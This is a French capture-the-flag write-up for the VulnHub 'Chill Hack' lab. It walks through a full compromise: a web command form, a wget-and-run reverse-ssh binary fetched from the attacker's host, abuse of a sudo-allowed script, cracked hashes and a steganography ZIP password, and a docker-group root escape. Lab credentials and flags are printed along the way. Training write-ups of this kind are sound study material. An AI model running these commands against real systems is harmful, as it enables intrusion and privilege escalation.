---
title: Solution du CTF Chill Hack de VulnHub
tags: [CTF, VulnHub]
---

### Chili Con Carne

[Chill Hack](https://vulnhub.com/entry/chill-hack-1,622/) est le nom d'un CTF créé par *Anurodh Acharya* et disponible sur VulnHub.

Let's hack !

```console
$ sudo nmap -sCV -p- -T5 --script vuln 192.168.56.113
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.113
Host is up (0.00032s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| vulners: 
|   vsftpd 3.0.3: 
|       CVE-2021-30047  7.5     https://vulners.com/cve/CVE-2021-30047
|_      CVE-2021-3618   7.4     https://vulners.com/cve/CVE-2021-3618
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
--- snip ---
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|       PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /secret/: Potentially interesting folder
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.1.1
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-sql-injection: 
|   Possible sqli for queries:
|_    http://192.168.56.113:80/js/pp_images%5Bset_position%5D;break;case"youtube":f=l(movie_width,movie_height),movie_id=o("v",pp_images[set_position]),""==movie_id&&(movie_id=pp_images[set_position].split("youtu.be/"),movie_id=movie_id[1],movie_id.indexOf("?%22%29=%27%20OR%20sqlspider
| vulners: 
|   cpe:/a:apache:http_server:2.4.29: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114      *EXPLOIT*
|       MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-       9.8     https://vulners.com/metasploit/MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-        *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-       9.8     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-        *EXPLOIT*
--- snip ---
|       B8198D62-F9C8-5E03-A301-9A3580070B4C    4.3     https://vulners.com/githubexploit/B8198D62-F9C8-5E03-A301-9A3580070B4C  *EXPLOIT*
|       1337DAY-ID-36854        4.3     https://vulners.com/zdt/1337DAY-ID-36854        *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|       PACKETSTORM:164501      0.0     https://vulners.com/packetstorm/PACKETSTORM:164501      *EXPLOIT*
|       PACKETSTORM:164418      0.0     https://vulners.com/packetstorm/PACKETSTORM:164418      *EXPLOIT*
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
MAC Address: 08:00:27:D1:B8:F0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.07 seconds
```

Nmap a trouvé par énumération un dossier nommé `secret`. Il s'avère que cette page n'attend que nos commandes via un formulaire.

Autant dire que le premier shell vien vite. Petit check rapide d'abord :

```bash
id;pwd;ls -a
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/var/www/html/secret
total 16
drwxr-xr-x 3 root root 4096 Oct  4  2020 .
drwxr-xr-x 8 root root 4096 Oct  3  2020 ..
drwxr-xr-x 2 root root 4096 Oct  3  2020 images
-rw-r--r-- 1 root root 1520 Oct  4  2020 index.php
```

Après au passe au shell interactif avec la mise en place de reverse-ssh :

```bash
cd /tmp;wget http://192.168.56.1:8000/reverse-sshx64;chmod 755 reverse-sshx64;nohup ./reverse-sshx64&
```

Obtenir le premier compte utilisateur n'est qu'une formalité :

```console
www-data@ubuntu:/home$ ls -al
total 20
drwxr-xr-x  5 root    root    4096 Oct  3  2020 .
drwxr-xr-x 24 root    root    4096 Oct  3  2020 ..
drwxr-x---  2 anurodh anurodh 4096 Oct  4  2020 anurodh
drwxr-xr-x  5 apaar   apaar   4096 Oct  4  2020 apaar
drwxr-x---  4 aurick  aurick  4096 Oct  3  2020 aurick
www-data@ubuntu:/home$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

Ce script bash prend un message en entrée et exécute ce qui a été saisi :

```console
www-data@ubuntu:/home$ cat /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
www-data@ubuntu:/home$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: `id`
Hello user! I am `id`,  Please enter your message: id 
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
Thank you for your precious time!
www-data@ubuntu:/home$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: rosebud
Hello user! I am rosebud,  Please enter your message: id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
Thank you for your precious time!
```

On peut s'en sortir de pleins de méthodes différentes, j'ai opté pour l'ajout de la clé SSH parmi celles autorisées.

```bash
cp /tmp/key_no_pass.pub /home/apaar/.ssh/authorized_keys
```

### Guacamole

La suite a été moins évidente.

Déjà l'utilisateur `apaar` a dans ses permissions sudo une commande qu'il peut lancer avec ses propres privilèges ; la même commande que précédemment.

En fait, je pense que c'est juste parce que tout le monde peut utiliser cette commande avec les droits de `apaar`, comme une règle globale.

```console
apaar@ubuntu:~$ sudo -l
Matching Defaults entries for apaar on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User apaar may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
apaar@ubuntu:~$ ls -al
total 44
drwxr-xr-x 5 apaar apaar 4096 Oct  4  2020 .
drwxr-xr-x 5 root  root  4096 Oct  3  2020 ..
-rw------- 1 apaar apaar    0 Oct  4  2020 .bash_history
-rw-r--r-- 1 apaar apaar  220 Oct  3  2020 .bash_logout
-rw-r--r-- 1 apaar apaar 3771 Oct  3  2020 .bashrc
drwx------ 2 apaar apaar 4096 Oct  3  2020 .cache
drwx------ 3 apaar apaar 4096 Oct  3  2020 .gnupg
-rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
-rw-r--r-- 1 apaar apaar  807 Oct  3  2020 .profile
drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .ssh
-rw------- 1 apaar apaar  817 Oct  3  2020 .viminfo
-rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt
apaar@ubuntu:~$ cat local.txt 
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
apaar@ubuntu:~$ id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
```

Je trouve parmi les fichiers de l'utilisateur un fichier qui était dispo sur le FTP que j'ai zappé dans la manip, mais visiblement, on a déjà passé l'étape du script.

```console
apaar@ubuntu:~$ find / -group apaar 2> /dev/null | grep -v /sys | grep -v /proc | grep -v /home/apaar
/run/user/1001
/run/user/1001/snapd-session-agent.socket
/run/user/1001/gnupg
/run/user/1001/gnupg/S.gpg-agent.extra
/run/user/1001/gnupg/S.dirmngr
/run/user/1001/gnupg/S.gpg-agent.browser
/run/user/1001/gnupg/S.gpg-agent.ssh
/run/user/1001/gnupg/S.gpg-agent
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.clone_children
/srv/ftp/note.txt
apaar@ubuntu:~$ cat /srv/ftp/note.txt
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

Quand je m'intéresse à l'utilisateur `anurodh` présent sur le système, c'est assez louche :

```console
apaar@ubuntu:~$ id anurodh
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
apaar@ubuntu:~$ find / -user anurodh -ls 2> /dev/null 
   655379      4 drwxr-x---   2 anurodh  anurodh      4096 Oct  4  2020 /home/anurodh
     9158     12 -rw-------   1 anurodh  anurodh     12288 Oct  4  2020 /var/tmp/.helpline.sh.swp
apaar@ubuntu:~$ ls -al /var/tmp/
total 32
drwxrwxrwt  5 root    root     4096 Jun 26 20:27 .
drwxr-xr-x 14 root    root     4096 Oct  3  2020 ..
-rw-------  1 anurodh anurodh 12288 Oct  4  2020 .helpline.sh.swp
drwx------  3 root    root     4096 Jun 26 20:00 systemd-private-2e3d7edd0e614897817c7ec7a3bdc52a-apache2.service-wSIfjq
drwx------  3 root    root     4096 Jun 26 20:27 systemd-private-2e3d7edd0e614897817c7ec7a3bdc52a-systemd-resolved.service-OzM5en
drwx------  3 root    root     4096 Jun 26 20:00 systemd-private-2e3d7edd0e614897817c7ec7a3bdc52a-systemd-timesyncd.service-wmmgHp
```

Il y a ce fichier swap qui correspond au nom du script dont on est propriétaire, sauf que l'emplacement du swap ne correspond pas.

Dans le doute, j'ai modifié `.helpline.sh` en espérant qu'il soit exécuté par une tâche CRON puis j'ai surveillé avec `pspy` mais rien n'a été exécuté.

Je note alors dans la liste des ports en écoute la présence d'un mysql et d'un Apache sur le port 9001.

D'après le fichier de configuration `/etc/apache2/sites-enabled/000-default.conf`, un site est effectivement délivré sur ce port qui n'est pas accessible de l'extérieur.

```apache
<VirtualHost *:9001>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/files
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

J'aurais pu faire une redirection de port via SSH mais comme on a accès au code source, autant en profiter :

```console
apaar@ubuntu:/var/www/files$ ls -al
total 28
drwxr-xr-x 3 root root 4096 Oct  3  2020 .
drwxr-xr-x 4 root root 4096 Oct  3  2020 ..
-rw-r--r-- 1 root root  391 Oct  3  2020 account.php
-rw-r--r-- 1 root root  453 Oct  3  2020 hacker.php
drwxr-xr-x 2 root root 4096 Oct  3  2020 images
-rw-r--r-- 1 root root 1153 Oct  3  2020 index.php
-rw-r--r-- 1 root root  545 Oct  3  2020 style.css
```

Le fichier d'index contient des identifiants pour la base de données :

```php
<?php
        if(isset($_POST['submit']))
        {
                $username = $_POST['username'];
                $password = $_POST['password'];
                ob_start();
                session_start();
                try
                {
                        $con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
                        $con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
                }
                catch(PDOException $e)
                {
                        exit("Connection failed ". $e->getMessage());
                }
                require_once("account.php");
                $account = new Account($con);
                $success = $account->login($username,$password);
                if($success)
                {
                        header("Location: hacker.php");
                }
        }
?>
```

Et j'y trouve deux hashs MD5 :

```console
apaar@ubuntu:/var/www/files$ mysql -u root -p webportal
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
2 rows in set (0.00 sec)
```

À l'aide de `crackstation.net` je trouve les mots de passe correspondant `masterpassword` et `dontaskdonttell`.

### Burrito

Cela semblait prometteur malheureusement ces mots de passe ne fonctionnent pas, que ce soit via sudo, mysql, ssh ou FTP.

C'est assez bizarre que le dossier `/var/www/files` contienne d'autres fichiers si la seule information valable était le mot de passe MySQL.

Il y a comme un message subliminal dans le fichier `hacker.php` :

```html
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
    color:red;
    font-weight: bold;
}
h1
{
    color: yellow;
    font-weight: bold;
}
</style>
<center>
    <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
    <h1 style="background-color:red;">You have reached this far. </h2>
    <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
```

Le HTML en lui-même n'a rien d'intéressant donc c'est sans doute lié aux images.

Les outils de stégano "classiques" reposent plutôt sur le format JPEG alors j'ai passé `stegoveritas` dessus :

```console
$ docker run -v /tmp/files:/data -it --rm bannsec/stegoveritas
(stegoveritas_venv) stegoveritas@f3d25a7228fe:~$ stegoveritas /data/images/hacker-with-laptop_23-2147985341.jpg
Running Module: SVImage
+------------------+------+
|   Image Format   | Mode |
+------------------+------+
| JPEG (ISO 10918) | RGB  |
+------------------+------+
+--------+------------------+------------------------------------------------------------------------------------------------+-----------+
| Offset | Carved/Extracted | Description                                                                                    | File Name |
+--------+------------------+------------------------------------------------------------------------------------------------+-----------+
| 0xec26 | Carved           | LZMA compressed data, properties: 0xBE, dictionary size: 0 bytes, uncompressed size: 100 bytes | EC26.7z   |
| 0xec26 | Extracted        | LZMA compressed data, properties: 0xBE, dictionary size: 0 bytes, uncompressed size: 100 bytes | EC26      |
| 0xf3d4 | Carved           | LZMA compressed data, properties: 0x90, dictionary size: 0 bytes, uncompressed size: 36 bytes  | F3D4.7z   |
| 0xf3d4 | Extracted        | LZMA compressed data, properties: 0x90, dictionary size: 0 bytes, uncompressed size: 36 bytes  | F3D4      |
+--------+------------------+------------------------------------------------------------------------------------------------+-----------+
+---------+------------------+-----------------------------------------------------------------------------------------------+-----------+
| Offset  | Carved/Extracted | Description                                                                                   | File Name |
+---------+------------------+-----------------------------------------------------------------------------------------------+-----------+
| 0x10d2a | Carved           | LZMA compressed data, properties: 0xD8, dictionary size: 0 bytes, uncompressed size: 32 bytes | 10D2A.7z  |
| 0x10d2a | Extracted        | LZMA compressed data, properties: 0xD8, dictionary size: 0 bytes, uncompressed size: 32 bytes | 10D2A     |
| 0x16102 | Carved           | LZMA compressed data, properties: 0x92, dictionary size: 0 bytes, uncompressed size: 36 bytes | 16102.7z  |
| 0x16102 | Extracted        | LZMA compressed data, properties: 0x92, dictionary size: 0 bytes, uncompressed size: 36 bytes | 16102     |
+---------+------------------+-----------------------------------------------------------------------------------------------+-----------+
Found something with StegHide: /home/stegoveritas/results/steghide_3dc2953322b173b835329787ca61e70a.bin
Running Module: MultiHandler

Found something worth keeping!
JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, baseline, precision 8, 626x417, components 3
Exif
====
+---------------------+---------------------------------------------------+
| key                 | value                                             |
+---------------------+---------------------------------------------------+
| SourceFile          | /data/images/hacker-with-laptop_23-2147985341.jpg |
| ExifToolVersion     | 11.88                                             |
| FileName            | hacker-with-laptop_23-2147985341.jpg              |
| Directory           | /data/images                                      |
| FileSize            | 67 kB                                             |
| FileModifyDate      | 2025:06:26 21:28:31+00:00                         |
| FileAccessDate      | 2025:06:26 21:29:03+00:00                         |
| FileInodeChangeDate | 2025:06:26 21:28:31+00:00                         |
| FilePermissions     | rw-r--r--                                         |
| FileType            | JPEG                                              |
| FileTypeExtension   | jpg                                               |
| MIMEType            | image/jpeg                                        |
| JFIFVersion         | 1.01                                              |
| ResolutionUnit      | inches                                            |
| XResolution         | 300                                               |
| YResolution         | 300                                               |
| ImageWidth          | 626                                               |
| ImageHeight         | 417                                               |
| EncodingProcess     | Baseline DCT, Huffman coding                      |
| BitsPerSample       | 8                                                 |
| ColorComponents     | 3                                                 |
| YCbCrSubSampling    | YCbCr4:4:4 (1 1)                                  |
| ImageSize           | 626x417                                           |
| Megapixels          | 0.261                                             |
+---------------------+---------------------------------------------------+
```

`steghide` a détecté du contenu caché dans l'image. Données valides ? Oui, il s'agit d'un ZIP contenant un fichier PHP :

```console
$ file steghide_7c2c7118699e28d0ad5b4718ede323fa.bin
steghide_7c2c7118699e28d0ad5b4718ede323fa.bin: Zip archive data, made by v3.0 UNIX, extract using at least v2.0, last modified, last modified Sun, Oct 03 2020 04:20:46, uncompressed size 1211, method=deflate
$ unzip -l steghide_7c2c7118699e28d0ad5b4718ede323fa.bin 
Archive:  steghide_7c2c7118699e28d0ad5b4718ede323fa.bin
  Length      Date    Time    Name
---------  ---------- -----   ----
     1211  2020-10-03 06:20   source_code.php
---------                     -------
     1211                     1 file
$ unzip steghide_7c2c7118699e28d0ad5b4718ede323fa.bin 
Archive:  steghide_7c2c7118699e28d0ad5b4718ede323fa.bin
[steghide_7c2c7118699e28d0ad5b4718ede323fa.bin] source_code.php password:
```

L'archive étant protégée par mot de passe, j'utilise l'exécutable `zip2john` qui vient avec la version communautaire Jumbo puis je passe le hash obtenu à JtR :

```console
$ john --wordlist=wordlists/rockyou.txt /tmp/hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
pass1word        (steghide_7c2c7118699e28d0ad5b4718ede323fa.bin/source_code.php)     
1g 0:00:00:00 DONE (2025-06-26 23:41) 33.33g/s 546133p/s 546133c/s 546133C/s tigger7..chatty
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Je peux alors décompresser l'archive et obtenir ce code :

```php
<?php
        if(isset($_POST['submit']))
        {
                $email = $_POST["email"];
                $password = $_POST["password"];
                if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
                { 
                        $random = rand(1000,9999);?><br><br><br>
                        <form method="POST">
                                Enter the OTP: <input type="number" name="otp">
                                <input type="submit" name="submitOtp" value="Submit">
                        </form>
                <?php   mail($email,"OTP for authentication",$random);
                        if(isset($_POST["submitOtp"]))
                                {
                                        $otp = $_POST["otp"];
                                        if($otp == $random)
                                        {
                                                echo "Welcome Anurodh!";
                                                header("Location: authenticated.php");
                                        }
                                        else
                                        {
                                                echo "Invalid OTP";
                                        }
                                }
                }
                else
                {
                        echo "Invalid Username or Password";
                }
        }
?>
```

Le base64 se décode en `!d0ntKn0wmYp@ssw0rd` et permet de se connecter sur le compte `anurodh`.

L'utilisateur faisant partie du groupe `docker`, je jette un œil aux containers et images disponibles :

```console
anurodh@ubuntu:~$ docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                   PORTS               NAMES
9b859d23108f        hello-world         "/hello"            4 years ago         Exited (0) 4 years ago                       quizzical_perlman
anurodh@ubuntu:~$ docker images 
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              latest              a24bb4013296        5 years ago         5.57MB
hello-world         latest              bf756fb1ae65        5 years ago         13.3kB
```

On va procéder à une escalade de privilèges classique via Docker en lançant un container sur lequel on a mappé le dossier `/root` :

```console
anurodh@ubuntu:~$ docker run -it -v /root:/real_root alpine
/ # cd /real_root
/real_root # ls
proof.txt
/real_root # cat proof.txt 


                                        {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}


Congratulations! You have successfully completed the challenge.


         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  


--------------------------------------------Designed By -------------------------------------------------------
                                        |  Anurodh Acharya |
                                        ---------------------

                                     Let me know if you liked it.

Twitter
        - @acharya_anurodh
Linkedin
        - www.linkedin.com/in/anurodh-acharya-b1937116a
```

La partie stégano tombait un peu comme un cheveu dans la soupe, surtout post-shell, pour le reste, c'était plutôt bien ficelé.
